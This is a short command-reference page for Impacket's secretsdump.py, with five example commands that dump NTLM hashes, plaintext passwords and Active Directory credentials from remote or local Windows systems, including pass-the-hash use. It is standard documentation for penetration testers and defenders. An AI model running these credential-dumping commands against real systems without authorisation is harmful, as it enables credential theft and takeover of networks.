# secretsdump.py

> Dump NTLM hashes, plaintext passwords, and domain credentials from remote Windows systems. Part of the Impacket suite. More information: <https://github.com/fortra/impacket>.

## Examples

### Dump credentials from a Windows machine using a username and password

```bash
secretsdump.py domain/username:password@target
```

### Dump hashes from a machine using pass-the-hash authentication

```bash
secretsdump.py -hashes LM_Hash:NT_Hash domain/username@target
```

### Dump credentials from Active Directory's NTDS.dit file

```bash
secretsdump.py -just-dc domain/username:password@target
```

### Extract credentials from a local SAM database using registry hives

```bash
secretsdump.py -sam path/to/SAM -system path/to/SYSTEM
```

### Dump hashes from a machine without providing a password (if a valid authentication session exists, e.g. via Kerberos or NTLM SSO)

```bash
secretsdump.py -no-pass domain/username@target
```
